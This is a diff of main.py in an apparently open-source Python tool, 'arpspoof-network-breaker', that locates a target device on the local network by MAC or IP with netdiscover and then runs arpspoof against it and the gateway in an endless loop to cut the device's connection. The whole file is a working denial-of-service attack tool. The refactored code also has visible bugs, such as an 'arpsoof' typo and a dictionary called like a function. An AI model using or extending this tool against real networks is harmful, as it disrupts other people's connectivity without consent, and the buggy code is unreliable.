@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # main.py
-# Copyright (C) 2018 Too-Naive
+# Copyright (C) 2018-2019 KunoiSayami
 #
 # This module is part of arpspoof-network-breaker and is released under
 # the AGPL v3 License: https://www.gnu.org/licenses/agpl-3.0.txt
@@ -17,9 +17,15 @@
 #
 # You should have received a copy of the GNU Affero General Public License
 # along with this program. If not, see <https://www.gnu.org/licenses/>.
-import subprocess, signal, random
-import time, netifaces, sys, re, socket
+import ctrlsub
 from configparser import ConfigParser
+import socket
+import time
+import re
+import netifaces
+import subprocess
+import sys
+import operator
 
 mac_match = re.compile(r'^(([0-9a-f]){2}[:-]){5}([0-9a-f]{2})$')
 ip_match = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
@@ -34,122 +40,120 @@ def vaildate_ip(ip_addr: str):
 		return False
 	return True
 
-class arpspoof_class(object):
-	def __init__(self, *, des_mac: str or None = None, des_ip: str or None = None, sleep_time: int = 60, arp_blocktime: int = 2, random_time: int = 0):
-		self.gateway_ip = ''
-		self.default_interfaces = 'eth0'
-		if len(sys.argv) > 1:
-			if mac_match.match(sys.argv[1]) is not None:
-				self.des_mac, self.des_ip = sys.argv[1], None
-			elif vaildate_ip(sys.argv[1]):
-				self.des_ip, self.des_mac = sys.argv[1], None
+if len(sys.argv) == 1:
+	config = ConfigParser()
+	if len(config.read('config.ini')) == 0 or not config.has_section('arpspoof') or not (config.has_option('arpspoof', 'mac') or config.has_option('arpsoof', 'ip')):
+		raise FileNotFoundError('Cannot find configure file')
+
+class interface(object):
+	def __init__(self, interface: str):
+		self.interface = interface
+		self.gateway = ''
+		n = netifaces.ifaddresses(interface)
+		self.ip = n[netifaces.AF_INET][0]['addr']
+		self.netmask = n[netifaces.AF_INET][0]['netmask']
+		n = netifaces.gateways()
+		for m in n[netifaces.AF_INET]:
+			if m[1] == interface:
+				self.gateway = m[0]
+				break
+		if self.gateway == '':
+			print(interface)
+			print(n)
+			raise ValueError('Gateway IP error')
+		self.base = self._get_base(self.netmask)
+		self.search_ip = self._get_search_ip()
+	@staticmethod
+	def _get_base(netmask: str):
+		return len(''.join([bin(int(x))[2:] for x in netmask.split('.')]).replace('0', ''))
+	def _get_search_ip(self):
+		tmp = '{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in self.ip.split('.'))[:self.base])
+		return '.'.join([str(int(tmp[x * 8 : (x + 1) * 8], 2)) for x in range(0, 4)])
+	def __str__(self):
+		return '{}: {}, {}, {}, {}, {}'.format(self.interface, self.ip, self.netmask, self.gateway, self.search_ip, self.base)
+	def check_sub(self, ip: str):
+		tmp = '{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in ip.split('.'))[:self.base])
+		ip_tmp = ''.join(list(reversed(str(int(''.join(list(reversed('{:0<32}'.format(''.join('{:08b}'.format(int(x)) for x in self.search_ip.split('.'))[:self.base])))))))))
+		return tmp.startswith(ip_tmp)
+		
+class arpcfg(object):
+	def __init__(self, cfgstr: str):
+		self.ip, self.mac, self.interface, self.gateway = cfgstr.split('\\n')
+
+class arp_class(object):
+	def __init__(self, mac_addr: str = '', ip: str = ''):
+		''' Define interface process sproof '''
+		self.target_interface = None
+		self.mac = mac_addr
+		self.ip = ip
+		self.vaildate()
+		# TODO: TBD thread search
+		self.interfaces = {name: interface(name) for name in netifaces.interfaces() if not any(name.startswith(x) for x in ('lo', 'docker'))}
+		self.load()
+	def call(self):
+		if self.mac != '' and self.ip == '':
+			self.search_mac()
+			self.main_activity()
 		else:
-			self.des_ip, self.des_mac = des_ip, des_mac
-		if self.des_ip is None and self.des_mac is None:
-			raise ValueError('Both vaule is none')
-		else:
-			if des_ip is not None:
-				if not vaildate_ip(self.des_ip): raise ValueError('IP address is invaild')
-			elif mac_match.match(self.des_mac) is None:
-				raise ValueError('Mac address is invaild')
-		self.sleep_time = int(sleep_time)
-		self.current_sleep_time = self.sleep_time
-		self.arp_blocktime = int(arp_blocktime)
-		self.random_time = int(random_time)
-		if not self.load() and self.des_ip is None:
-			self.get_ip_from_mac()
-		if self.gateway_ip == '': self.get_gateway_ip()
+			self.main_activity()
+	def search_child(self, l: interface):
+		netdiscover_proc = subprocess.Popen(['netdiscover', '-i', l.interface, '-r', '{}/{}'.format(l.search_ip, l.base), '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+		for x in netdiscover_proc.communicate()[0].decode().splitlines():
+			if len(x.split()) > 3 and self.mac in x.split()[1]:
+				self.ip = x.split()[0]
+				self.target_interface = l
+				break
+	def search_mac(self):
+		l = [item for _, item in self.interfaces.items()]
+		l.sort(key = operator.attrgetter('base'), reverse = True)
+		for x in l:
+			self.search_child(x)
+			if self.ip != '': break
+		if self.ip == '': raise RuntimeError('Cannot found IP by MAC address')
 		self.save()
-	def checker(self):
-		if self.gateway_ip == '': return False
-		if self.des_mac == '' and vaildate_ip(self.des_ip): return True
-		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', '{}/32'.format(self.des_ip), '-i', self.default_interfaces, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-		netdiscover_proc.wait()
-		return self.des_mac in netdiscover_proc.communicate()[0].decode()
+	def search_ip(self):
+		for _, n in self.interfaces.items():
+			if n.check_sub(self.ip):
+				self.target_interface = n
+				break
+		if self.target_interface is None:
+			self.target_interface = self.interfaces[input('Cannot find interface to process, please specify interface [{}]: '.format(','.join(n for n, _ in self.interfaces.items())))]
+	def vaildate(self):
+		if len(self.mac):
+			self.mac = self.mac.lower().replace('-', ':')
+			if mac_match.match(self.mac) is None:
+				raise ValueError('MAC address is invaild')
+		if len(self.ip):
+			if not vaildate_ip(self.ip):
+				raise ValueError('IP address is invaild')
+		if not len(self.mac) and not len(self.ip):
+			raise ValueError('Both value is None')
 	def load(self, file_name: str = '.arpcfg'):
 		try:
 			with open(file_name) as fin:
-				ip, mac, inf, gate = fin.read().split('\\\\n')
-			if self.des_mac == mac or self.des_ip == ip:
-				self.des_ip, self.des_mac, self.default_interfaces, self.gateway_ip = ip, mac, inf, gate
-			else: return False
+				r = fin.readlines()
+			l = map(arpcfg, (r if '\n' not in r else r[:-1] for x in r))
+			for x in l:
+				if self.check(x.ip, x.mac, x.interface):
+					self.target_interface = self.interfaces(x.interface)
+					del l, r
+					return True
+			return False
 		except FileNotFoundError: pass
-		return self.checker()
 	def save(self, file_name: str = '.arpcfg'):
-		with open(file_name, 'w') as fout:
-			fout.write('\\\\n'.join((self.des_ip, self.des_mac, self.default_interfaces, self.gateway_ip)))
-	def get_ip_from_mac(self):
-		#print(netifaces.interfaces())
-		for interface in netifaces.interfaces():
-			if interface.startswith('lo') or interface.startswith('docker'): continue
-			#print('searching...', interface)
-			addrs, netmask, self.self_ip = netifaces.ifaddresses(interface), '', ''
-			for _, li in addrs.items():
-				if vaildate_ip(li[0]['addr']):
-					netmask = li[0]['netmask']
-					self.self_ip = li[0]['addr']
-					break
-			if netmask == '':
-				print(repr(addrs))
-				raise ValueError('Cannot find netmask')
-			ip_group = self.self_ip.split('.')
-			netmask_group = netmask.split('.')
-			breaksig = 4
-			for x in range(3, -1, -1):
-				if netmask_group[x] == '0':
-					ip_group[x] = '0'
-				else:
-					breaksig = x + 1
-					break
-			self.search_ip = '{}.{}.{}.{}/{}'.format(*ip_group, 8 * breaksig)
-			#print(self.search_ip)
-			try:
-				self.des_ip = self._call_netdiscover_search(self.search_ip, self.des_mac, interface)
-				self.default_interfaces = interface
-				if not vaildate_ip(self.des_ip): continue
-				#print(self.des_ip)
-				break
-			except:
-				print(interface, self.search_ip)
+		with open(file_name, 'a') as fout:
+			print('\\n'.join((self.ip, self.mac, self.target_interface.interface, self.target_interface.gateway)), file = fout)
 	@staticmethod
-	def get_random_time(base_time: int, random_range: int):
-		if random_range == 0: return base_time
-		return random.randint(base_time - random_range if base_time - random_range < 0 else 0, base_time + random_range)
-	@staticmethod
-	def _call_netdiscover_search(search_ip: str, mac_addr: str, interface: str):
-		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', search_ip, '-i', interface, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-		#time.sleep(5)
-		netdiscover_proc.wait()
-		netdiscover_proc.send_signal(signal.SIGINT)
-		for x in netdiscover_proc.communicate()[0].decode().splitlines():
-			if mac_addr.lower() in x:
-				break
-		#print(repr(x.split()))
-		return x.split()[0]
-	def main_spoof(self):
-		printl('Start spoof')
-		spoof = subprocess.Popen(['arpspoof', '-i', self.default_interfaces, '-t', self.gateway_ip, '-r', self.des_ip])
-		time.sleep(self.arp_blocktime if self.random_time == 0 else self.arp_blocktime + random.randint(0, 2))
-		spoof.send_signal(signal.SIGINT)
-		printl('Wait arpspoof to exit (fix connection)')
-		spoof.wait()
-		self.current_sleep_time = self.get_random_time(self.sleep_time, self.random_time)
-		printl('Exited!(sleep {}(s))'.format(self.current_sleep_time))
-	def get_gateway_ip(self):
-		#print(self.default_interfaces)
-		for interface in netifaces.gateways()[2]:
-			#print(interface)
-			if self.default_interfaces in interface:
-				self.gateway_ip = interface[0]
-				break
-		if self.gateway_ip == '':
-			#print(netifaces.gateways())
-			raise ValueError('Gateway ip error')
+	def check(ip_addr: str, mac: str, interface_name: str):
+		netdiscover_proc = subprocess.Popen(['netdiscover', '-r', '{}/32'.format(ip_addr), '-i', interface_name, '-P'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+		return mac in netdiscover_proc.communicate()[0].decode()
 	def main_activity(self):
 		while True:
 			try:
-				self.main_spoof()
-				time.sleep(self.current_sleep_time)
+				printl('Start spoof')
+				ctrlsub.runable(['arpspoof', '-i', self.target_interface.interface, '-t', self.target_interface.gateway, '-r', self.ip], 10, exit_msg = 'Wait arpspoof to exit (fix connection)')
+				printl('Stopped')
+				time.sleep(60)
 			except KeyboardInterrupt:
 				while True:
 					try:
@@ -157,23 +161,17 @@ class arpspoof_class(object):
 						break
 					except (EOFError, KeyboardInterrupt):
 						return
+			except SystemExit as e:
+				raise e
 			except:
 				import traceback
-				print(self.des_ip, self.des_mac, self.search_ip, self.gateway_ip)
+				print(self.ip, self.mac, self.interfaces)
 				traceback.print_exc()
-def main():
-	if len(sys.argv) == 2:
-		arpspoof_class().main_activity()
-	config = ConfigParser()
-	if len(config.read('config.ini')) == 0 or not config.has_section('arpspoof') or not (config.has_option('arpspoof', 'mac') or config.has_option('arpsoof', 'ip')):
-		raise FileNotFoundError('Cannot find configure file')
-	arpspoof_class(
-		des_ip = config['arpspoof']['ip'] if config.has_option('arpspoof', 'ip') and config['arpspoof']['ip'] != '' else None,
-		des_mac = config['arpspoof']['mac'] if config.has_option('arpspoof', 'mac') and config['arpspoof']['mac'] != '' else None,
-		sleep_time = config['arpspoof']['interval'] if config.has_option('arpspoof', 'interval') and config['arpspoof']['interval'] != '' else 60,
-		arp_blocktime = config['arpspoof']['blocktime'] if config.has_option('arpspoof', 'blocktime') and config['arpspoof']['blocktime'] != '' else 2,
-		random_time = config['arpspoof']['random_time'] if config.has_option('arpspoof', 'random_time') and config['arpspoof']['random_time'] != '' else 0
-	).main_activity()
 
-if __name__ == '__main__':
+def main():
+	mac = config['arpspoof']['mac'] if config.has_option('arpspoof', 'mac') and config['arpspoof']['mac'] != '' else ''
+	ip = config['arpspoof']['ip'] if config.has_option('arpspoof', 'ip') and config['arpspoof']['ip'] != '' else ''
+	arp_class(mac, ip).call()
+
+if __name__ == "__main__":
 	main()
